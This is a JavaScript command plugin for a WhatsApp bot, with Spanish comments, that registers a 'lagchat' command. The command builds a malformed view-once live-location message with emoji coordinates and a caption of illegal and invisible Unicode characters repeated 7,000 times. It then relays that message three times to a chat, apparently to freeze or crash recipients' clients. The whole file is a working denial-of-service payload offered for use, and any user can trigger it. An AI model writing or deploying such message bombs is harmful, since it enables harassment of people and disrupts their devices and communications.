const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: ('\uFFFF\uFFFE\u2063💥').repeat(7000), // mezcla caracteres ilegales y ocultos
        sequenceNumber: '999999',
        jpegThumbnail: Buffer.alloc(1024, 0), // miniatura ligera
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Super Lag WhatsApp',
            body: 'Mensaje con caracteres ilegales',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 3

  await m.reply(`⚠️ Enviando ${times} super bombas al chat...`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 200))
    } catch (error) {
      console.error('Error al enviar mensaje:', error)
      await m.reply('❗ Error al enviar mensaje.')
      return
    }
  }

  await m.reply('✅ *Lagchat super debil enviado.*')
}

handler.command = /^lagchat$/i
handler.owner = false

export default handler